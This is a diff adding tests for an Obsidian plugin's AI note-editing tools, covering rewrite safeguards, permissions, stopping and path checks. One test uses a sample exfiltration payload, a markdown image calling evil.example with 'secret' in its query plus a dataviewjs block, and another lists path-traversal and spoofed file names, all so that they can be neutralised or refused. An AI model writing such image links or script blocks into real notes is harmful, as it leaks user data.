@@ -1,7 +1,7 @@
 import "./obsidian-stub";
 import test from "node:test";
 import assert from "node:assert/strict";
-import { resolveNote, runTool, runToolChat, toolAsk, VaultPort } from "../src/vaulttools";
+import { resolveNote, runTool, runToolChat, safeForNote, toolAsk, VaultPort } from "../src/vaulttools";
 import { readPiece, streamText, StreamCall, toolStreamCall, ToolMsg } from "../src/stream";
 import type { AgentEvent, PermissionAnswer } from "../src/agent";
 
@@ -224,4 +224,108 @@ test("a note can be rewritten whole, but not emptied, and not one of Grill's own
 	await runToolChat({ ...scripted([{ text: "", calls: [call("write_note", { path: "IS", content: "x" })] }, { text: "ok" }]), port: v, level: "safe", onEvent: () => undefined, ask: async () => (asks++, "deny") });
 	assert.equal(asks, 1);
 	assert.equal(v.files["Macro/IS.md"], "# IS\nAll new.");
+});
+
+test("a rewrite is made only from the whole note as it now reads", async () => {
+	const long = `---\ntags: [macro]\n---\n# IS\n${"A line of the note.\n".repeat(40)}The last line.`;
+	const v = vault({ "Macro/IS.md": long, "Macro/Other.md": "other" });
+	const rewrite = call("write_note", { path: "IS", content: "# IS\nOnly what the prompt showed." }, "w1");
+	// Without reading it first: refused, and nothing is lost.
+	const blind = scripted([{ text: "", calls: [rewrite] }, { text: "ok" }]);
+	await runToolChat({ ...blind, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
+	assert.equal(v.files["Macro/IS.md"], long);
+	assert.match((blind.seen[1].at(-1) as Extract<ToolMsg, { role: "tool" }>).results[0].content, /read_note first/);
+	// Read, then rewritten: done.
+	await runToolChat({ ...scripted([{ text: "", calls: [call("read_note", { path: "IS" }, "r1")] }, { text: "", calls: [rewrite] }, { text: "ok" }]), port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
+	assert.equal(v.files["Macro/IS.md"], "# IS\nOnly what the prompt showed.");
+	// Changed by hand between the read and the rewrite: refused.
+	v.files["Macro/IS.md"] = long;
+	const stale = scripted([{ text: "", calls: [call("read_note", { path: "IS" }, "r1")] }, { text: "", calls: [rewrite] }, { text: "ok" }]);
+	const step = stale.step;
+	let n = 0;
+	stale.step = async (steps, onText) => {
+		if (++n === 2) v.files["Macro/IS.md"] = `${long}\nAdded by hand.`;
+		return step(steps, onText);
+	};
+	await runToolChat({ ...stale, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
+	assert.equal(v.files["Macro/IS.md"], `${long}\nAdded by hand.`);
+	// Too long to have been read whole: never rewritten whole.
+	const huge = "x".repeat(70_000);
+	v.files["Macro/Other.md"] = huge;
+	assert.match((await runTool(v, call("write_note", { path: "Other", content: "short" }))).content, /too long/);
+	assert.equal(v.files["Macro/Other.md"], huge);
+	// The card for a rewrite says how much goes.
+	assert.equal(toolAsk(rewrite, long).detail, "Replaces the whole note: 45 lines now, 2 after.");
+});
+
+test("what a model writes into a note is made inert, and what the note already had is left alone", async () => {
+	const own = "![chart](https://example.com/mine.png)";
+	const v = vault({ "A.md": `# A\n${own}\nA line.` });
+	const bad = "![x](https://evil.example/?d=secret)\n```dataviewjs\ndv.x()\n```";
+	const seen = new Map<string, string>();
+	await runTool(v, call("read_note", { path: "A" }), seen);
+	await runTool(v, call("write_note", { path: "A", content: `# A\n${own}\n${bad}` }), seen);
+	assert.ok(v.files["A.md"].includes(own), "the student's own picture is kept as it was");
+	assert.ok(!v.files["A.md"].includes("![x](https://evil"), "a new remote picture is not left to load");
+	assert.ok(!v.files["A.md"].includes("```dataviewjs"), "a block a plugin would run is plain code");
+	await runTool(v, call("edit_note", { path: "A", old_text: "A line.", new_text: bad }));
+	assert.ok(!v.files["A.md"].includes("![x](https://evil"));
+	await runTool(v, call("create_note", { path: "B", content: bad }));
+	assert.ok(!v.files["B.md"].includes("![x](https://evil") && !v.files["B.md"].includes("```dataviewjs"));
+	assert.equal(safeForNote("", "plain *text* and a [[link]]"), "plain *text* and a [[link]]");
+	const diagram = "```mermaid\nflowchart LR\n  A[\"Demand\"] --> B[\"Output\"]\n```";
+	assert.equal(safeForNote("", diagram), diagram, "a plain diagram is still a diagram");
+	assert.ok(!safeForNote("", "```mermaid\nflowchart LR\n  A --> B\n  click A \"https://x\"\n```").startsWith("```mermaid"), "one that does more is plain code");
+});
+
+test("Always allow covers one kind of change, for the chat", async () => {
+	const v = vault({ "A.md": "one", "B.md": "two" });
+	const allowed = new Set<string>();
+	const asked: string[] = [];
+	const ask = async (req: { title: string }) => (asked.push(req.title), "always" as PermissionAnswer);
+	const turn = (calls: ReturnType<typeof call>[]) => runToolChat({ ...scripted([{ text: "", calls }, { text: "ok" }]), port: v, level: "safe", onEvent: () => undefined, ask, allowed });
+	await turn([call("edit_note", { path: "A", old_text: "one", new_text: "1" }, "a"), call("create_note", { path: "New", content: "x" }, "b")]);
+	assert.deepEqual(asked, ["Edit A", "Create New"], "allowing edits did not allow a new note");
+	// The next message of the same chat: edits are still allowed, nothing is asked.
+	await turn([call("edit_note", { path: "B", old_text: "two", new_text: "2" }, "c")]);
+	assert.equal(asked.length, 2);
+	assert.equal(v.files["B.md"], "2");
+});
+
+test("a request cut off for length is not asked for again and again", async () => {
+	const v = vault({ "A.md": "one" });
+	let requests = 0;
+	const cut = { step: async () => (requests++, { text: "", truncated: true, calls: [call("write_note", { __unreadable: '{"path":"A","content":"...' })] }) };
+	const done = await runToolChat({ ...cut, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
+	assert.equal(requests, 2);
+	assert.match(done.text, /too long/);
+});
+
+test("a stop is heeded before the next request, and a stopped request is never sent", async () => {
+	const v = vault({ "A.md": "one" });
+	const stop = new AbortController();
+	let requests = 0;
+	const model = { step: async () => (requests++, stop.abort(), { text: "", truncated: false, calls: [] as ReturnType<typeof call>[] }) };
+	model.step = async () => (requests++, { text: "", truncated: false, calls: [call("list_notes", {})] });
+	const ask = async () => "once" as PermissionAnswer;
+	const p = runToolChat({ ...model, port: v, level: "auto", onEvent: (e) => e.kind === "activity" && stop.abort(), ask, signal: stop.signal });
+	await assert.rejects(p, /Stopped/);
+	assert.equal(requests, 1);
+	let sent = 0;
+	const gone = new AbortController();
+	gone.abort();
+	await assert.rejects(
+		streamText({ kind: "openai", url: "http://x", headers: {}, body: {} } as unknown as StreamCall, { onText: () => undefined, idleMs: 1000, signal: gone.signal, fetch: (async () => (sent++, new Response("{}"))) as typeof fetch }),
+		/Stopped/,
+	);
+	assert.equal(sent, 0);
+});
+
+test("a note with Windows line endings is edited across lines, and odd paths are refused", async () => {
+	const v = vault({ "W.md": "one\r\ntwo\r\nthree" });
+	assert.equal((await runTool(v, call("edit_note", { path: "W", old_text: "one\ntwo", new_text: "1\n2" }))).content, "Changed W.md.");
+	assert.equal(v.files["W.md"], "1\r\n2\r\nthree");
+	for (const path of [".obsidian/x.md", ".trash/x.md", "notes/ .md", "a/../b.md", "notes/\u202Egnp.md", "a\\b.md", "C:/x.md"]) {
+		assert.equal((await runTool(v, call("create_note", { path, content: "x" }))).failed, true, path);
+	}
 });
